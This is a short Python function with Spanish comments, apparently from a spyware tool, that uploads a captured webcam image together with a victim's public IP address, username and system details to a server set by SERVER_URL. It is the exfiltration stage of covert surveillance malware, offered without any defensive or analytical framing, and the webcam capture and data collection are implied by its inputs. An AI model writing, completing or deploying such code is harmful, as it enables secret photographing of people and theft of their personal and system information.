def enviar_al_servidor(info, archivos):
    try:
        # Verifica si el archivo existe
        if archivos["webcam"] is None or not os.path.exists(archivos["webcam"]):
            print("[!] Imagen de webcam no capturada o no encontrada.")
            return

        print("[*] Info a enviar:")
        print(f"IP Pública: {info['ip_publica']}")
        print(f"Usuario: {info['usuario']}")
        print(f"Sistema: {info['sistema']}")
        print(f"Info completa: {json.dumps(info, indent=2)}")

        with open(archivos["webcam"], "rb") as img:
            files = {
                "image": img,
            }
            data = {
                "ip": info["ip_publica"],
                "username": info["usuario"],
                "system_info": json.dumps(info),
            }
            response = requests.post(SERVER_URL, files=files, data=data)
            print("[+] Enviado al servidor:", response.status_code)
            print("[*] Respuesta del servidor:", response.text)
    except Exception as e:
        print(f"[!] Error enviando datos: {e}")

